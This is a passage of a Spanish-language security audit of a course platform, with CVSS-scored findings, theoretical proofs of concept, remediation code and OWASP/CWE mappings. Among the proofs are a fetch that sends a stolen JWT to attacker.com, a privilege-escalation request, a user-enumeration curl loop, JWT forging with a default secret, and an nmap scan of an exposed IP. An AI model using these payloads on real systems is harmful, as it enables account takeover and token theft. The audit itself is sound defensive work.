  Content-Type: application/json
  
  { "is_superuser": true, "rol": "administrador" }
  ```
  El endpoint llama `crud.update_user(db_user, user_in)` que invoca `db_user.sqlmodel_update(user_in.model_dump(exclude_unset=True))` aplicando todos los campos provistos. La respuesta devuelve `UserPublic` con el flag actualizado. Desde ese momento, todas las verificaciones de `is_superuser` pasan. Vector alternativo: cualquier admin puede demoting/locking a otro admin (`is_active: false`) o cambiar su email para hacer takeover via reset password.

### FND-002 — Sin rate limiting

- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L` → **Score 8.2 (Alto)** (clasificado como Crítico en este informe por aggregación de impactos: enumeración + brute force + email bombing)
- **Justificación:** Network, AC bajo, sin auth (PR:N), sin UI. C:H porque enumeration revela todos los emails; A:L por email bombing.
- **PoC teórica:** Atacante itera con un diccionario contra `/login/access-token`:
  ```
  POST /api/v1/login/access-token
  Content-Type: application/x-www-form-urlencoded
  
  username=admin@empresa.com&password=Verano2025!
  ```
  Sin límite de intentos, prueba ~1M passwords en horas. Paralelamente, contra `/password-recovery/{email}` enumera la base de usuarios completa (FND-004). Adicionalmente, dispara 10,000 emails de recovery a la misma víctima en minutos (email bombing → potencial baneo del dominio en proveedores SMTP).

### FND-003 — JWT en localStorage

- **CVSS v3.1:** `AV:N/AC:H/UI:R/PR:N/S:C/C:H/I:H/A:N` → **Score 7.7 (Alto)**
- **Justificación:** Requiere XSS preexistente (AC alto, UI required para activar el XSS), pero el impacto cuando ocurre es total: takeover. Scope changed (componente atacado: frontend; componente afectado: cuenta entera).
- **PoC teórica:** Si un atacante encuentra un solo XSS reflected (e.g. en un parámetro de búsqueda no escapado en alguna page futura) inyecta:
  ```javascript
  fetch('https://attacker.com/x?t=' + localStorage.getItem('access_token'));
  ```
  El JWT exfiltrado dura 8 días (FND-007). Mientras tanto el atacante puede llamar cualquier endpoint con esos privilegios. Si la víctima es admin → combinable con FND-001 → superusuario permanente.

### FND-004 — User enumeration

- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` → **Score 5.3 (Medio)** (priorizado como Alto en este informe por su rol de habilitador de FND-002)
- **PoC:** `for email in lista; do curl -X POST .../password-recovery/$email -o /dev/null -w "%{http_code}\n"; done` → 404 vs 200 revela cuáles existen.

### FND-005 — Sin protección server-side de rutas

- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` → **Score 4.3 (Medio)** (Alto por implicación con FND-001)
- **PoC:** Un usuario `estudiante` carga `https://app/admin/usuarios`. El layout renderiza HTML inicial y luego redirige. Aunque la API rechaza requests, el reconocimiento (URLs, estructura del panel) es trivial.

### FND-006 — `SECRET_KEY=changethis` en local

- **CVSS v3.1:** `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` → **Score 7.4 (Alto)** (en local; mitigado a 0 en producción por el `raise ValueError`)
- **PoC:** Si un servidor de staging accidentalmente queda con `ENVIRONMENT=local`, atacante con conocimiento del secret default forja JWT:
  ```python
  jwt.encode({"sub": "<uuid del superusuario>", "exp": time()+86400}, "changethis", algorithm="HS256")
  ```

### FND-007 — JWT 8 días sin revocación

- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` → **Score 6.5 (Medio)** (clasificado Alto por amplificación de FND-003)
- **PoC:** Un token comprometido funciona durante 8 días. Cambiar la contraseña no invalida tokens emitidos previamente (no se chequea `password_changed_at` ni versión de token).

### FND-008 — Sin headers de seguridad

- **CVSS v3.1:** `AV:N/AC:H/UI:R/PR:N/S:U/C:L/I:L/A:N` → **Score 4.7 (Medio)** (Alto si combina con XSS futuro)
- **PoC:** Sin `X-Frame-Options`, `<iframe src="https://app/admin">` desde `attacker.com` puede usarse para clickjacking; sin CSP, cualquier XSS reflected futuro escapa todas las defensas modernas (`script-src` impedirá el `fetch` exfiltrante de FND-003).

### FND-009 — Race condition certificados

- **CVSS v3.1:** `AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L` → **Score 3.1 (Bajo)** (clasificado Alto por integridad de datos académicos)
- **PoC:** Atacante con sesión válida envía dos requests concurrentes que disparan `check_and_emit_certificate` (e.g. completar la última lección dos veces). Resultado: dos rows en `certificado` con `inscripcion_id` duplicado. Folios "oficiales" duplicados rompen la lógica de verificación de autenticidad.

### FND-010 — Race condition pago + inscripción

- **CVSS v3.1:** `AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:L` → **Score 5.2 (Medio)** (Alto por impacto en negocio: usuario paga y no recibe servicio)
- **PoC:** Crash del backend entre `update_pago_status(...COMPLETADO)` y `create_inscripcion`. PayPal cobra al usuario; el sistema interno reporta pago completado pero sin inscripción → soporte manual obligatorio para resolver cada caso.

### FND-011 — IP EC2 expuesta

- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` → **Score 5.3 (Medio)** (Alto por reducción del costo de reconocimiento)
- **PoC:** `nmap -sV 44.250.178.54` desde cualquier máquina. Identifica SO, versión SSH, puertos abiertos. Combinable con cualquier 0day de SSH/OpenSSL.

### FND-012 — CORS permisivo

- **CVSS v3.1:** `AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N` → **Score 4.7 (Medio)**
- **PoC:** Si un origen permitido se compromete (e.g. subdominio dev olvidado) → CSRF cross-origin con headers personalizados.

### FND-013 — MIME spoofing en uploads

- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N` → **Score 5.4 (Medio)**
- **PoC:** Subir `payload.html` con `Content-Type: image/jpeg` como cover. URL servida desde `/media/covers/{curso_id}.jpeg` — la extensión es válida pero el contenido es HTML. Al ser servido por StaticFiles con MIME `image/jpeg` el navegador no debería renderizarlo como HTML, pero algunas configuraciones de proxy o servicios CDN podrían interpretarlo distinto.

### FND-014 — Token reset en URL

- **CVSS v3.1:** `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N` → **Score 6.8 (Medio)**
- **PoC:** Usuario recibe email con link `https://app/reset-password?token=AbCd...`. Hace clic. URL queda en historial; si comparte pantalla o screenshot, el token queda visible. Un proxy corporativo logea la URL completa.

### FND-015 — SameSite=Lax

- **CVSS v3.1:** `AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N` → **Score 3.1 (Bajo)** (Medio por sesiones admin)
- **PoC:** GET con efecto secundario (no debería existir, pero si aparece en futuras rutas) → CSRF posible vía `<a target>` en sitio externo.

### FND-016 — Adminer expuesto

- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` → **Score 9.8 (Crítico)** si se levanta el compose principal en producción; **Score 0** si solo se usa en dev.
- **PoC:** `https://adminer.example.com` → login con `POSTGRES_USER`/`POSTGRES_PASSWORD`. Si las credenciales son débiles → SQL arbitrario contra producción.

### FND-017 — Containers como root

- **CVSS v3.1:** `AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H` → **Score 7.5 (Alto)**
- **PoC:** RCE en aplicación (e.g. via dependencia vulnerable futura) → root en container → CVE de runc/kernel → host comprometido.

### FND-018 — `/private` en local

- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` → **Score 9.1 (Crítico)** si se despliega mal; mitigado por validación en config en producción.

### FND-019 — Timezone naive comparison

- **CVSS v3.1:** `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N` → **Score 3.7 (Bajo)**
- **PoC:** Si un driver retorna `password_reset_expira` como naive en una zona donde UTC offset > 0, `replace(tzinfo=utc)` desplaza la hora — token podría aceptarse hasta horas después del expire real.

### FND-020 — HTTP puerto 80 directo

- **CVSS v3.1:** `AV:N/AC:H/UI:R/PR:N/S:U/C:H/I:H/A:N` → **Score 6.8 (Medio)** (depende de si ALB delante fuerza HTTPS).

### FND-021 a FND-027 — Bajos

- Score CVSS estimado entre 0 y 3.5. Detalles abreviados:
  - **FND-021** (zod ausente): CVSS 0 — defensa en profundidad.
  - **FND-022** (DOMPurify ausente): CVSS 0 — preventivo.
  - **FND-023** (SECURITY.md genérico): CVSS 0 — operacional, score 2.x si reportes responsables se pierden.
  - **FND-024** (sin gitleaks): CVSS 0 — preventivo.
  - **FND-025** (sin Sentry frontend): CVSS 3.1 — `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L` por imposibilidad de detectar incidentes.
  - **FND-026** (gitignore inconsistencia): CVSS 0.
  - **FND-027** (Dockerfile sin .dockerignore): CVSS 5.5 si developer build local; 0 en CI.

---

## 5. Fase 4 — Remediación

> Las correcciones se presentan como **referencia documental**. Aplicarlas requiere revisión en su contexto y testing — no se modifica código en esta auditoría.

### FND-001 — Mass assignment

**Antes** ([backend/app/models/user.py:42-44](backend/app/models/user.py#L42-L44)):
```python
class UserUpdate(UserBase):
    email: EmailStr | None = Field(default=None, max_length=255)
    password: str | None = Field(default=None, min_length=8, max_length=128)
```

**Después (opción A: schema dedicado, no hereda UserBase):**
```python
class UserUpdate(SQLModel):
    email: EmailStr | None = Field(default=None, max_length=255)
    full_name: str | None = Field(default=None, max_length=255)
    password: str | None = Field(default=None, min_length=8, max_length=128)
    telefono: str | None = Field(default=None, max_length=20)
    is_active: bool | None = None
    estado: EstadoUsuario | None = None
    rol: RolUsuario | None = None
    # Nota: is_superuser DELIBERADAMENTE excluido. Para promover a superuser
    # usar un endpoint dedicado /users/{id}/promote-superuser con verificación
    # adicional (e.g. require_superuser, log de auditoría).

    model_config = ConfigDict(extra='forbid')  # rechaza campos desconocidos
```

**Después (opción B: usar `model_config` para excluir):**
```python
class UserUpdate(UserBase):
    email: EmailStr | None = Field(default=None, max_length=255)
    password: str | None = Field(default=None, min_length=8, max_length=128)
    is_superuser: bool = Field(default=False, exclude=True, frozen=True)

    model_config = ConfigDict(extra='forbid')
```

Adicionalmente en [backend/app/api/routes/users.py:227](backend/app/api/routes/users.py#L227), agregar verificación defensiva:
```python
def update_user(*, session, user_id, user_in: UserUpdate, current_user: AdminOrSuperuser):
    # Defensa en profundidad: aunque el schema lo bloquea, verificar en runtime
    payload = user_in.model_dump(exclude_unset=True)
    if 'is_superuser' in payload or 'rol' in payload and not current_user.is_superuser:
        raise HTTPException(403, "Solo superuser puede modificar privilegios")
    # ...
```

**Mejor práctica FastAPI:** un schema por operación (Create / Update / UpdateMe / Public). Nunca compartir el modelo de DB como contrato HTTP entrante.

### FND-002 — Rate limiting

**Instalar** `slowapi`:
```toml
# pyproject.toml
"slowapi>=0.1.9,<1.0.0"
```

**Configurar** ([backend/app/main.py](backend/app/main.py)):
```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address, default_limits=["200/minute"])
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)
```

**Aplicar** en endpoints públicos:
```python
# backend/app/api/routes/login.py
from app.main import limiter

@router.post("/login/access-token")
@limiter.limit("5/minute")          # 5 intentos por IP por minuto
def login_access_token(request: Request, ...): ...

@router.post("/password-recovery/{email}")
@limiter.limit("3/hour")            # 3 emails por IP por hora
def recover_password(request: Request, ...): ...
```

**En producción** usar Redis backend (`limits[redis]`) y combinar con clave de email/usuario para evitar que un atacante distribuya brute force entre IPs.

### FND-003 — JWT en HttpOnly cookies

**Backend** ([backend/app/api/routes/login.py](backend/app/api/routes/login.py)):
```python
from fastapi import Response

@router.post("/login/access-token")
def login_access_token(response: Response, session: SessionDep, form_data: ...):
    user = crud.authenticate(...)
    if not user: raise HTTPException(...)
    access_token_expires = timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
    token = security.create_access_token(user.id, expires_delta=access_token_expires)
    response.set_cookie(
        key="access_token",
        value=token,
        httponly=True,
        secure=settings.ENVIRONMENT != "local",
        samesite="strict",
        max_age=settings.ACCESS_TOKEN_EXPIRE_MINUTES * 60,
        path="/",
    )
    return Token(access_token=token)  # opcional: seguir devolviendo en body durante migración
```

**Frontend** ([frontend/src/lib/auth.ts](frontend/src/lib/auth.ts)):
```typescript
// Eliminar localStorage; el browser maneja la cookie automáticamente.
export function getToken(): null { return null; /* ya no se necesita en cliente */ }
export function setToken(_: string): void { /* no-op: backend setea cookie */ }
export function clearToken(): void {
  // Llamar endpoint /logout que haga response.delete_cookie()
}
```

**Backend dep** ([backend/app/api/deps.py](backend/app/api/deps.py)) — leer cookie en lugar de header:
```python
from fastapi import Cookie

def get_current_user(
    session: SessionDep,
    access_token: Annotated[str | None, Cookie()] = None,
) -> User:
    if not access_token:
        raise HTTPException(401, "No autenticado")
    # ... resto igual
```

**Migración:** mantener compatibilidad con header `Authorization: Bearer` durante 1 sprint, luego deprecar.

### FND-004 — User enumeration

**Antes** ([backend/app/api/routes/login.py:54-65](backend/app/api/routes/login.py#L54-L65)):
```python
if not user:
    raise HTTPException(status_code=404, detail="The user with this email does not exist...")
```

**Después** (mismo patrón que `solicitar-reactivacion`):
```python
@router.post("/password-recovery/{email}")
def recover_password(email: str, session: SessionDep) -> Message:
    user = crud.get_user_by_email(session=session, email=email)
    # Respuesta uniforme: no revelar existencia
    if user and user.is_active:
        token = secrets.token_urlsafe(32)
        user.password_reset_token = token
        user.password_reset_expira = datetime.now(timezone.utc) + timedelta(...)
        session.add(user); session.commit()
        email_data = generate_reset_password_email(...)
        send_email(...)
    return Message(message="Si el correo existe, recibirás instrucciones.")
```

### FND-005 — Middleware server-side real

**Renombrar** `frontend/src/proxy.ts` → `frontend/src/middleware.ts` (Next.js detecta automáticamente). Y pasar a leer **JWT de cookie HttpOnly** (no `user_rol` falsificable):

```typescript
// frontend/src/middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import { jwtVerify } from 'jose';

const SECRET = new TextEncoder().encode(process.env.JWT_PUBLIC_VERIFY_KEY!);

export async function middleware(req: NextRequest) {
  const token = req.cookies.get('access_token')?.value;
  const path = req.nextUrl.pathname;

  const protectedPrefixes = ['/admin', '/instructor', '/supervisor', '/perfil'];
  const isProtected = protectedPrefixes.some(p => path.startsWith(p));
  if (!isProtected) return NextResponse.next();

  if (!token) return NextResponse.redirect(new URL('/?error=auth', req.url));

  try {
    const { payload } = await jwtVerify(token, SECRET);
    const rol = payload.rol as string;
    if (path.startsWith('/admin') && rol !== 'administrador' && !payload.is_superuser) {
      return NextResponse.redirect(new URL('/?error=role', req.url));
    }
    // ...análogo para /instructor, /supervisor
    return NextResponse.next();
  } catch {
    return NextResponse.redirect(new URL('/?error=auth', req.url));
  }
}

export const config = {
  matcher: ['/admin/:path*', '/instructor/:path*', '/supervisor/:path*', '/perfil/:path*'],
};
```

**Nota:** verificar firma con clave pública requiere migrar a RS256 o exponer una clave de verificación; alternativamente, hacer una llamada `fetch('/api/v1/users/me')` desde el middleware (más lento pero correcto).

### FND-006 — `SECRET_KEY` obligatorio en todos los entornos

**Antes** ([backend/app/core/config.py:34](backend/app/core/config.py#L34)):
```python
SECRET_KEY: str = secrets.token_urlsafe(32)
```

**Después:**
```python
SECRET_KEY: str  # Sin default. Pydantic lanza error si .env no la define.

@model_validator(mode="after")
def _enforce_strong_secret(self) -> Self:
    if self.SECRET_KEY in ("changethis", "", "secret"):
        raise ValueError(f"SECRET_KEY débil/default detectada en {self.ENVIRONMENT}")
    if len(self.SECRET_KEY) < 32:
        raise ValueError("SECRET_KEY debe tener al menos 32 caracteres")
    return self
```

Documentar en `.env.example`:
```
# SECRET_KEY: generar con `python -c "import secrets; print(secrets.token_urlsafe(64))"`
SECRET_KEY=
```

### FND-007 — Expiración corta + refresh token

**Backend:**
```python
# config.py
ACCESS_TOKEN_EXPIRE_MINUTES: int = 30      # antes: 11520
REFRESH_TOKEN_EXPIRE_DAYS: int = 30

# security.py
def create_refresh_token(subject: str) -> str:
    expire = datetime.now(timezone.utc) + timedelta(days=settings.REFRESH_TOKEN_EXPIRE_DAYS)
    return jwt.encode({"sub": str(subject), "exp": expire, "type": "refresh"},
                       settings.SECRET_KEY, algorithm=ALGORITHM)
```

Endpoint `POST /login/refresh-token` que valida el refresh token (cookie httpOnly separada) y emite nuevo access token. Implementar denylist de tokens revocados en Redis.

### FND-008 — Headers de seguridad

**Frontend** ([frontend/next.config.ts](frontend/next.config.ts)):
```typescript
const nextConfig: NextConfig = {
  // ... resto igual
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          { key: 'X-Frame-Options', value: 'DENY' },
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
          { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' https://www.paypal.com https://www.paypalobjects.com",
              "style-src 'self' 'unsafe-inline'",  // Next.js inline styles
              "img-src 'self' data: blob: https://*.b-cdn.net",
              "connect-src 'self' https://video.bunnycdn.com https://api-m.sandbox.paypal.com https://api-m.paypal.com",
              "frame-src https://www.paypal.com",
              "object-src 'none'",
              "base-uri 'self'",
              "form-action 'self'",
              "frame-ancestors 'none'",
              "upgrade-insecure-requests",
            ].join('; '),
          },
          { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
        ],
      },
    ];
  },
};
```

**Backend** — middleware equivalente:
```python
# backend/app/main.py
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        if settings.ENVIRONMENT != "local":
            response.headers["Strict-Transport-Security"] = "max-age=63072000; includeSubDomains; preload"
        return response

app.add_middleware(SecurityHeadersMiddleware)
```

### FND-009 — Race condition certificados

**Solución 1 (recomendada): unique constraint + try/except**

Migración Alembic:
```python
op.create_unique_constraint("uq_certificado_inscripcion_id", "certificado", ["inscripcion_id"])
```

[backend/app/crud.py:585-609](backend/app/crud.py#L585-L609):
```python
from sqlalchemy.exc import IntegrityError

def check_and_emit_certificate(*, session, inscripcion_id):
    # ... verificación de progreso igual ...
    folio = f"NG-{secrets.token_hex(FOLIO_TOKEN_BYTES).upper()}"
    hash_ver = hashlib.sha256(f"{inscripcion_id}{folio}".encode()).hexdigest()
    certificado = Certificado(inscripcion_id=inscripcion_id, ...)
    session.add(certificado)
    inscripcion.estado = EstadoInscripcion.FINALIZADA
    session.add(inscripcion)
    try:
        session.commit()
    except IntegrityError:
        session.rollback()
        # Otro request ganó la carrera; devolver el existente
        return session.exec(
            select(Certificado).where(Certificado.inscripcion_id == inscripcion_id)
        ).first()
    session.refresh(certificado)
    return certificado
```

**Solución 2: lock pesimista**
```python
# antes de crear, obtener lock por inscripcion_id
session.exec(
    select(Inscripcion).where(Inscripcion.id == inscripcion_id).with_for_update()
).first()
```

### FND-010 — Atomicidad pago + inscripción

[backend/app/api/routes/pagos.py:130-190](backend/app/api/routes/pagos.py#L130-L190):
```python
@router.post("/confirmar")
def confirmar_pago(*, session, current_user, body):
    pago = crud.get_pago_by_id(...)
    # ... validaciones idempotencia ...
    capture = paypal_svc.capture_order(body.paypal_order_id)
    if (capture.get("status") or "").upper() != "COMPLETED":
        # Marcar como fallido en transacción separada (esto sí es seguro)
        crud.update_pago_status(..., status=EstadoPago.FALLIDO)
        raise HTTPException(402, "...")

    # Transacción atómica: pago COMPLETADO + inscripción
    try:
        pago.status = EstadoPago.COMPLETADO
        pago.referencia_paypal = body.paypal_order_id
        session.add(pago)
        insc = crud.get_inscripcion_by_usuario_curso(...)
        if not insc:
            insc = Inscripcion(usuario_id=pago.usuario_id, curso_id=pago.curso_id, ...)
            session.add(insc)
        session.commit()  # un solo commit
    except Exception:
        session.rollback()
        raise

    return ConfirmarPagoResponse(...)
```

**Mejor**: usar `session.begin_nested()` (savepoints) o, en PostgreSQL, transacción `SERIALIZABLE` para la operación crítica.

### FND-011 — IP EC2 fuera del workflow

[.github/workflows/deploy.yml](.github/workflows/deploy.yml):
```yaml
# Reemplazar todas las apariciones de 44.250.178.54 por:
ec2-user@${{ secrets.EC2_HOST }}
```

Y en GitHub Settings → Secrets agregar `EC2_HOST` con el valor real (o mejor: usar AWS Systems Manager Session Manager, sin IP pública).

[frontend/next.config.ts:14-19](frontend/next.config.ts#L14-L19) — eliminar el `remotePattern` con IP hardcodeada; reemplazar por dominio `api.dominio.com`.

### FND-012 — CORS más estricto

[backend/app/main.py:33-40](backend/app/main.py#L33-L40):
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.all_cors_origins,
    allow_origin_regex=None,  # eliminar regex de loca.lt en local; mejor usar lista explícita
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
    allow_headers=[
        "Authorization", "Content-Type", "X-Requested-With",
        "Tus-Resumable", "Upload-Length", "Upload-Offset", "Upload-Metadata",  # tus-js-client
    ],
    expose_headers=["X-Total-Count"],  # solo lo que el cliente realmente necesita
    max_age=3600,
)
```

### FND-013 — Magic bytes en uploads

```python
import magic  # python-magic-bin en Windows, python-magic en Linux

ALLOWED_MAGIC = {
    b"\xff\xd8\xff": "image/jpeg",
    b"\x89PNG\r\n\x1a\n": "image/png",
    b"RIFF": "image/webp",  # más check con offset
    b"GIF8": "image/gif",
}

def validate_magic(contents: bytes, allowed_mimes: set[str]) -> str:
    detected = magic.from_buffer(contents[:4096], mime=True)
    if detected not in allowed_mimes:
        raise HTTPException(400, f"Tipo real ({detected}) no permitido")
    return detected

# en upload_cover:
contents = await file.read()
real_mime = validate_magic(contents, ALLOWED_IMAGE_TYPES)
```

### FND-014 — Token reset en POST body

**Frontend** ([frontend/src/app/reset-password/page.tsx](frontend/src/app/reset-password/page.tsx)):
- Mover el token de la URL a un fragmento `#token=...` (no enviado al servidor por defecto, no log de proxies).
- O: link en email apunta a página intermedia que lee el token, hace POST inmediato a `/reset-password-init` y obtiene una sesión temporal corta.

### FND-015 — `SameSite=Strict`

[frontend/src/lib/auth.ts:35,53-54](frontend/src/lib/auth.ts#L35) → `SameSite=Strict`. Validar UX (login flow desde email link sigue funcionando porque es same-site al volver a la app).

### FND-016 — Adminer fuera del compose principal

Mover [docker-compose.yml:22-43](docker-compose.yml#L22-L43) a `docker-compose.dev.yml` (solo dev). En dev agregar middleware Traefik de basic auth:
```yaml
- traefik.http.routers.${STACK_NAME}-adminer-https.middlewares=admin-auth
- traefik.http.middlewares.admin-auth.basicauth.users=${ADMINER_USER}:${ADMINER_PASS_HTPASSWD}
```

### FND-017 — `USER` no-root en Dockerfiles

[backend/Dockerfile](backend/Dockerfile):
```dockerfile
# antes del CMD
RUN useradd -m -u 1000 appuser && chown -R appuser:appuser /app
USER appuser
CMD ["sh", "-c", "fastapi run --workers ${WEB_CONCURRENCY:-4} app/main.py"]
```

[frontend/Dockerfile](frontend/Dockerfile):
```dockerfile
FROM node:20-alpine AS runner
WORKDIR /app
ENV NODE_ENV=production
ENV NEXT_TELEMETRY_DISABLED=1
COPY --from=builder --chown=node:node /app/.next ./.next
COPY --from=builder --chown=node:node /app/node_modules ./node_modules
COPY --from=builder --chown=node:node /app/package.json ./package.json
COPY --from=builder --chown=node:node /app/public ./public
USER node
EXPOSE 3000
CMD ["npm", "run", "start"]
```

### FND-018 — Defensa en profundidad para `/private`

[backend/app/api/routes/private.py](backend/app/api/routes/private.py) — agregar dependency global:
```python
from fastapi import Depends, HTTPException
from app.core.config import settings

def _require_local_env():
    if settings.ENVIRONMENT != "local":
        raise HTTPException(404, "Not found")  # 404 mejor que 403 para no revelar existencia

router = APIRouter(prefix="/private", tags=["private"], dependencies=[Depends(_require_local_env)])
```

### FND-019 — Comparación tz-aware uniforme

[backend/app/api/routes/login.py:98](backend/app/api/routes/login.py#L98), [users.py:347](backend/app/api/routes/users.py#L347):
```python
# Migrar columna a TIMESTAMP WITH TIME ZONE en Alembic
# y comparar sin replace:
expira = user.password_reset_expira
if expira is None:
    raise HTTPException(400, "Token expirado")
if expira.tzinfo is None:
    expira = expira.replace(tzinfo=timezone.utc)  # solo si la migración aún no se aplicó
if datetime.now(timezone.utc) > expira:
    raise HTTPException(400, "Token expirado")
```

### FND-020 — Forzar HTTPS en docker-compose.prod.yml

Documentar y validar que delante del puerto 80 hay un ALB con redirect 80→443. Alternativa: poner Traefik también en producción (ya existe `docker-compose.traefik.yml`).

### FND-021 a FND-027 — Bajos

- **FND-021**: agregar `zod` y crear `frontend/src/schemas/` con un schema por formulario:
  ```typescript
  import { z } from 'zod';
  export const ResetPasswordSchema = z.object({
    password: z.string().min(8).max(128),
    confirm: z.string(),
  }).refine(d => d.password === d.confirm, { message: "No coinciden" });
  ```
- **FND-022**: cuando se introduzca rich text → `npm i dompurify @types/dompurify` y sanitizar antes de `dangerouslySetInnerHTML`.
- **FND-023**: actualizar [SECURITY.md](SECURITY.md) con email real (e.g. `seguridad@ngcourses.com`) y proceso de coordinated disclosure (PGP key, 90 días, etc.).
- **FND-024**: agregar `.pre-commit-config.yaml`:
  ```yaml
  repos:
    - repo: https://github.com/gitleaks/gitleaks
      rev: v8.18.0
      hooks:
        - id: gitleaks
  ```
- **FND-025**: `npm i @sentry/nextjs` y configurar en `frontend/sentry.client.config.ts` con DSN de proyecto frontend separado.
- **FND-026**: remover `package-lock.json` del `.gitignore` raíz.
- **FND-027**: crear `frontend/.dockerignore`:
  ```
  .env*
  !.env.local.example
  node_modules
  .next
  .git
  .vscode
  ```

---

## 6. Recomendaciones generales

### 6.1 Seguridad operativa

- **Rotación de secretos:** definir un calendario (cada 90 días para `SECRET_KEY`, anual para credenciales DB). Documentar el procedimiento en un runbook. Considerar AWS Secrets Manager o HashiCorp Vault en lugar de `.env.prod` plano en EC2.
- **Pre-commit hooks:** instalar `gitleaks` + `detect-secrets`. CI debe ejecutar `gitleaks detect --source .` en cada PR.
- **CI dependency scanning:** añadir paso en `.github/workflows/deploy.yml`:
  ```yaml
  - name: pip audit
    run: pip install pip-audit && pip-audit -r backend/requirements.txt
  - name: npm audit
    run: npm audit --workspace=frontend --audit-level=high
  ```
- **Monitoreo unificado:** Sentry frontend + backend, alertas en Slack/email. Logs estructurados (JSON) con campos `request_id`, `user_id`, `endpoint`. Dashboard de métricas de seguridad: requests con 401/403 por IP, tasa de errores en `/login`, intentos de reset.

### 6.2 Proceso de revisión

- **Threat modeling** por feature nueva. Especialmente para nuevos endpoints públicos.
- **Tests de seguridad** automatizados en CI: pytest con casos de auth (intentar acceso sin token, con token inválido, con role insuficiente).
- **Bug bounty** o **canal responsable de divulgación** documentado en `SECURITY.md` real.

### 6.3 Documentación pendiente

- Actualizar [README.md "Deuda técnica conocida"](README.md) referenciando este documento.
- Crear un `CHANGELOG-SECURITY.md` que registre fixes con CVE/CWE referenciados.

### 6.4 Hallazgos NO encontrados (controles efectivos del proyecto)

Estos son controles **bien implementados** que no requieren acción y deben mantenerse como baseline:

- **SQL injection:** SQLModel/SQLAlchemy parametrizado en todas las queries auditadas. No se encontró uso peligroso de `text()` ni f-strings con SQL.
- **Deserialización insegura:** sin `pickle`, `yaml.load(unsafe)`, `eval`, `exec` en el codebase.
- **SSRF:** sin URLs controladas por el usuario en llamadas `requests`/`httpx`.
- **Password hashing:** bcrypt con `passlib` y rounds default razonables (>10).
- **CI/CD:** OIDC + AssumeRole, sin credenciales AWS hardcodeadas.
- **Webhook validation:** firma HMAC validada en webhook Bunny (cuando `BUNNY_WEBHOOK_SECRET` está configurado).
- **Lockfiles versionados:** `uv.lock` + `package-lock.json` presentes (builds reproducibles).
- **Validación de defaults peligrosos:** `_check_default_secret` rechaza `changethis` en staging/production.

---

## 7. Anexo

### 7.1 Mapeo OWASP Top 10 2021

| OWASP Category | Hallazgos |
|---|---|
| A01: Broken Access Control | FND-001, FND-005 |
| A02: Cryptographic Failures | FND-003, FND-006, FND-014, FND-020 |
| A03: Injection | (sin hallazgos — controlado) |
| A04: Insecure Design | FND-009, FND-010, FND-019 |
| A05: Security Misconfiguration | FND-008, FND-011, FND-012, FND-016, FND-017, FND-018, FND-027 |
| A06: Vulnerable & Outdated Components | (sin hallazgos críticos en versiones declaradas; recomendado audit periódico) |
| A07: Identification & Authentication Failures | FND-002, FND-003, FND-004, FND-007, FND-015 |
| A08: Software and Data Integrity Failures | FND-009 |
| A09: Security Logging & Monitoring | FND-025 |
| A10: Server-Side Request Forgery | (sin hallazgos — controlado) |
| Otros (process) | FND-013, FND-021, FND-022, FND-023, FND-024, FND-026 |

### 7.2 Mapeo CWE

| CWE | Descripción | Hallazgos |
|---|---|---|
| CWE-20 | Improper Input Validation | FND-021 |
| CWE-79 | Cross-site Scripting | FND-022 (preventivo) |
| CWE-200 | Information Exposure | FND-011 |
| CWE-204 | Observable Response Discrepancy | FND-004 |
| CWE-250 | Execution with Unnecessary Privileges | FND-017 |
| CWE-307 | Improper Restriction of Authentication Attempts | FND-002 |
| CWE-319 | Cleartext Transmission | FND-020 |
| CWE-352 | CSRF | FND-015 |
| CWE-362 | Concurrent Execution / Race | FND-009, FND-010 |
| CWE-367 | TOCTOU | FND-009 |
| CWE-434 | Unrestricted Upload | FND-013 |
| CWE-489 | Active Debug Code | FND-016, FND-018 |
| CWE-538 | Sensitive Info in Externally-Accessible File | FND-027 |
| CWE-540 | Sensitive Info in Source Code | FND-024 |
| CWE-598 | Info Exposure via Query Strings | FND-014 |
| CWE-602 | Client-Side Enforcement of Server-Side Security | FND-005 |
| CWE-613 | Insufficient Session Expiration | FND-007 |
